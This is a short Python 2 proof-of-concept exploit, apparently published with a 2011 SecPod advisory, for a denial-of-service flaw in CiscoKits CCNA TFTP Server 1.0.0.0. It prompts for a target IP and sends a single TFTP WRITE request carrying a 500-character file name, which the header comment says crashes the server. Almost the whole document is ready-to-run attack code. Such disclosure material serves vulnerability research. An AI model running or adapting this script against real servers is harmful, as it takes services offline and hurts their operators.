#!/usr/bin/python
##############################################################################
# Title    : CiscoKits CCNA TFTP Server Denial Of Service Vulnerability
# Author   : Prabhu S Angadi from SecPod Technologies (www.secpod.com)
# Vendor   : http://www.certificationkits.com/cisco-ccna-tftp-server/
# Advisory : http://secpod.org/blog/?p=271
#            http://secpod.org/SECPOD_CiscoKits_CCNA_TFTP_DoS_POC.py
#            http://secpod.org/advisories/SECPOD_Ciscokits_CCNA_TFTP_DoS.txt
# Version  : CiscoKits CCNA TFTP Server 1.0.0.0
# Date     : 21/07/2011
##############################################################################

import socket,sys,time

port   = 69
target = raw_input("Enter host/target ip address: ")

if not target:
    print "Host/Target IP Address is not specified"
    sys.exit(1)

print "you entered ", target

try:
    socket.inet_aton(target)
except socket.error:
    print "Invalid IP address found ..."
    sys.exit(1)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
    print "socket() failed"
    sys.exit(1)

#File name >= 222 length leads to crash
exploit = "A" * 500

mode = "netascii"
print "File name WRITE crash"
# WRITE command = \x00\x02
data = "\x00\x02" + exploit + "\0" + mode + "\0"
sock.sendto(data, (target, port))
time.sleep(5)
